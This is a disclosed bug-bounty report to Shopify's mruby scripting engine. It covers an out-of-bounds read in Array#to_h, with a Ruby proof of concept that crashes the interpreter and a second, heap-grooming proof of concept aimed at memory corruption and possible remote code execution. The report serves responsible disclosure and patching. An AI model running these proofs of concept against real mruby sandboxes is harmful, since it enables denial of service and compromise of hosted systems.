@@ -1,0 +1,141 @@
+ReportLink:https://hackerone.com/reports/181321
+WeaknessName:Code Injection
+Reporter:https://hackerone.com/isra17
+ReportedTo:shopify-scripts(shopify-scripts)
+BountyAmount:20000.0
+Severity:critical
+State:Closed
+DateOfDisclosure:16.12.2016 20:05:00
+
+Summary:
+
+This bug was found with `jmlb337`.
+
+## Vulnerability 
+The function `to_h` will call the C function  `mrb_ary_to_h`.  This will iterate through the elements of the array.  If an element is not of type Array it will call attempt to call `to_ary` method of that object.  If `to_ary` does not return an array, the function will raise a ruby exception with the class name in the exception message.
+
+However, the code does not properly check that the array length was not modified during the call of `to_ary`. The vulnerability is triggered when the array is shrunk during call to `to_ary`, letting `mrb_ary_to_h` read an out of bound object to get an element classname.  A crash or or denial of service can be triggered by neutering the array in the `to_ary` call. A `mrb_obj_iv_set` call done on the controlled class pointer can be used to have a memory write leading to RCE.
+
+
+## Reproduction Step
+1. Define a new class that will define the method `to_ary`.
+2. in the `to_ary` clear a global array that will be later define and return a non array object.
+3. Create the global array containing an instance of the defined class.
+4. Call `to_h` on that array.
+
+## PoC DOS
+```ruby
+class A
+  def to_ary
+    $a.clear
+    nil
+  end
+end
+$a = [A.new]
+$a.to_h
+```
+This POC will cause a null memory access and terminate the mruby process.
+
+## Explaination
+The bug is triggered due to call back to `to_ary` in [array.c:130](https://github.com/mruby/mruby/blob/master/mrbgems/mruby-array-ext/src/array.c#L130): 
+```c
+ v = mrb_check_array_type(mrb, RARRAY_PTR(ary)[i]);
+```
+
+The function `mrb_check_array_type` check if the element at `RARRAY_PTR(ary)[i]`.  in the case of the POC it will be of type `A`.  It will then continue to call the `to_ary` method of the `A` class to convert the value into an array.
+
+```c
+MRB_API mrb_value
+mrb_check_array_type(mrb_state *mrb, mrb_value ary)
+{
+  return mrb_check_convert_type(mrb, ary, MRB_TT_ARRAY, "Array", "to_ary");
+}
+
+MRB_API mrb_value
+mrb_check_convert_type(mrb_state *mrb, mrb_value val, enum mrb_vtype type, const char *tname, const char *method)
+{
+  mrb_value v;
+
+  if (mrb_type(val) == type && type != MRB_TT_DATA) return val;
+  v = convert_type(mrb, val, tname, method, FALSE);
+  if (mrb_nil_p(v) || mrb_type(v) != type) return mrb_nil_value();
+  return v;
+}
+```
+
+By calling the `Array#clear` method on the global array, the pointer to the array data (`ptr`) will be set to null.
+```c
+MRB_API mrb_value
+mrb_ary_clear(mrb_state *mrb, mrb_value self)
+{
+...
+  a->len = 0;
+  a->aux.capa = 0;
+  a->ptr = 0;
+...
+```
+
+Since `to_ary` will not return an array, the C code will attempt to raise an exception with the class name in the exception message.
+```c
+ if (mrb_nil_p(v)) {
+      mrb_raisef(mrb, E_TYPE_ERROR, "wrong element type %S at %S (expected array)",
+        mrb_str_new_cstr(mrb,  mrb_obj_classname(mrb, RARRAY_PTR(ary)[i])),
+```
+when it calls `RARRAY_PTR(ary)[i]` it will attempt to reference `0[i]` and crash the process.
+
+## Exploitability
+
+The vulnerability is exploitable as long as the attacker can run arbitrary ruby code in the mruby interpreter. It should cover mruby-engine case as used by Shopify.
+
+## Impact
+
+This vulnerability can cause a Denial Of service on the mruby process very reliably.  It could also lead to farther memory corruption and potentially lead to Remote Code Execution.
+
+We are convinced we can push this bug further to lead to memory corruption and RCE. I spoke with François Chagnon and we preferred to report the bugs as soon as possible while working on a complete proof of concept afterward so it can get patched earlier. Therefor we would like a week or two to get time to work on this and be able to claim the higher tier bounty. The proof of concept would also used the other reported bug [#181319](https://hackerone.com/reports/181319) to get a memory disclosure.
+
+## Possible Remote Code Execution POC #2
+```ruby
+$size = 32
+$bb = []
+for i in 0..256
+ $bb.push("b"*$size)
+end
+
+class A
+ def to_ary
+   $bb.clear
+   $a.clear
+   $a.push("b"*256)
+   #first byte is 0 as long as the lsb != 1 its fine
+   $a.push("\x00bcdefg\x70hijklmnopqurtuvwxyzABCDEFGHIJKLMNOPQRSTUVWXY"*3 + ("a"*200))
+   $a.push("y"*256)
+   $a.push("e"*256)
+
+   return "a"
+ end
+end
+
+$a = [[1,"a"],[1,"a"],[1,"a"],[1,"a"],[1,"a"],[1,"a"],A.new]
+
+for i in 0..256
+ $bb.push("z"*$size)
+end
+
+@a = $a.to_h
+```
+
+## Exploitation
+In the second POC, and attacker creates an array of 7 elements where the last element has an object with the vulnerable to_ary method.  7 elements is important because when the bug is triggered the index of the array will be out of bounds by 3 pointer size.  That is where our data will be.
+
+after clearing the global array push some elements back into the array. No more than 4 since that will increase the capacity of the array to 8 and our index will not be out of bounds.
+
+by pushing the large strings the data of the strings will be placed after the array data.  When the call is made to `mrb_obj_classname(mrb, RARRAY_PTR(ary)[i])`,
+user controlled data will be returned.  
+
+An attacker could then craft an `mrb_value` object using the strings and cause farther memory corruption.
+
+There exists code paths that could allow an attacker to right data to a pointer crafted by the attacker.
+
+## Proposed Fix
+
+See patch in attachment.
